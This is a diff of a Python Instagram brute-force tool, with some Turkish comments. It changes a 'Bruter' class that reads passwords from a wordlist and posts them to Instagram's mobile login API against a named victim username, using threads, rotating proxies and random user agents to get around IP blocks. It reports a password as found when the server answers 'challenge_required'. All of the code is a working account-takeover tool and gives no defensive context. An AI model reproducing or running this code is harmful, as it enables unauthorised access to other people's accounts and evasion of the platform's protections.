@@ -1,7 +1,7 @@
 from datetime import datetime
 from time import (sleep,time)
 from .proxychecker import ProxyChecker
-from .console import (Console,runnerBruteBanner)
+from .console import (Console,runnerBruteBanner,bruteAttackFinished)
 from threading import (Thread,Lock)
 from queue import Queue
 from random import (choice,randint)
@@ -18,9 +18,8 @@ class Bruter:
         self.__proxy_type = proxy_type
         self.__victim = victim
         self.__getproxy = []
-        self.__ip = ""
-        self.__passw = ""
-        self.__isAlive = True
+        self.__passw = "" # ekrana parolayı yazdırmak için tanımlanan değişken
+        self.__isAlive = True 
         self.__prxs = ["http","socks4","socks5"]
         os.system("cls")
 
@@ -50,11 +49,6 @@ class Bruter:
                     password = q.get()
                     dispose = "" # Parola deneme sırasında çalışan proxye denk gelirsem buna kaydedicem işlem yapıp ardından yok edicem
                     choice_proxy = choice(self.__getproxy)
-                    # print(runnerBruteBanner(passw=password,ip=choice_proxy,
-                    #                     words=len(list(self.__readerwordlist())),
-                    #                     prxies=len(self.__getproxy),target=self.__victim))
-                    # sleep(1)
-                    # os.system("cls")
                     __header = {
                         'Host':'i.instagram.com','Accept':'*/*',  'User-Agent': self.__useragents(),
                         'Cookie':'missing','Accept-Encoding':'gzip, deflate',
@@ -64,7 +58,7 @@ class Bruter:
                     __data = {
                             "uuid": uuid.uuid4(),"password": password,
                             "username": self.__victim,'device_id':uuid.uuid4(),
-                            'from_reg':'false','_csrftoken':self.__csrfToken(),
+                            'from_reg':'false','_csrftoken':"missing",
                             'login_attempt_countn':'0'
                         }
                     if not self.__proxy_type in self.__prxs:
@@ -77,9 +71,7 @@ class Bruter:
                             "http":f"{self.__proxy_type}://{choice_proxy}",
                             "https":f"{self.__proxy_type}://{choice_proxy}"
                         }
-                    s = session.post("https://i.instagram.com/api/v1/accounts/login/",
-                                        data=__data,headers=__header,
-                                        proxies=__proxies,timeout=randint(5,50))
+                    s = session.post("https://i.instagram.com/api/v1/accounts/login/",data=__data,headers=__header,proxies=__proxies,timeout=randint(5,50))
 
                     json_load = json.loads(s.text)
                     for k,v in json_load.items():
@@ -91,27 +83,29 @@ class Bruter:
 
                         elif k == "error_type":
                             if v == "ip_block":
-                                print(f"{Console.BLUE}Blocked IP: {choice_proxy}{Console.DEFAULT}")
                                 del dispose
+
                             elif v == "bad_password":
                                 dispose = choice_proxy
-                                print("Great Password %s" % choice_proxy)
-                                print("Password %s" % password)
                                 __proxies.update({"http":f"{self.__proxy_type}://{dispose}","https":f"{self.__proxy_type}://{dispose}"})
 
                         elif k == "message":
-                            # print(json_load)
                             if v == "challenge_required":
                                 self.__isAlive = False
                                 self.__passw = password
                                 q.queue.clear()
                                 q.task_done()
 
+                    os.system("cls")
+                    print(runnerBruteBanner(passw=password,ip=choice_proxy,
+                                            words=len(list(self.__readerwordlist())),
+                                            prxies=len(self.__getproxy),target=self.__victim))
+
             except (requests.exceptions.ConnectTimeout,
                     requests.exceptions.ConnectionError,
                     requests.exceptions.ProxyError,
                     requests.exceptions.ReadTimeout,KeyError):
-                q.task_done()
+                pass
 
     def __readerwordlist(self):
         try:
@@ -133,6 +127,7 @@ class Bruter:
         __queue = Queue()
         __threads = []
         __queuelock = Lock()
+        first = time()
         try:
             for passw in self.__readerwordlist():
                 __queue.put(passw)
@@ -150,12 +145,16 @@ class Bruter:
                 __queuelock.release()
                 if not self.__isAlive:
                     break
-
-            print("Brute Force Attack is completed")
+            
+            last = time()
+            now_time = (last-first).__round__(3)
             if self.__isAlive:
-                print("Password not found.")
+                print(f"{Console.PURPLE}[ {Console.RED}!{Console.PURPLE} ] Password not found.{Console.DEFAULT}")
+            
             else:
-                print("Password is Found! %s" % self.__passw)
+                print(f"{Console.PURPLE}[ {Console.RED}+{Console.PURPLE} ] Password is Found : {Console.CYAN}{self.__passw}{Console.DEFAULT}")
 
+            print(bruteAttackFinished(now_time))
+        
         except Exception as e:
             print(e)
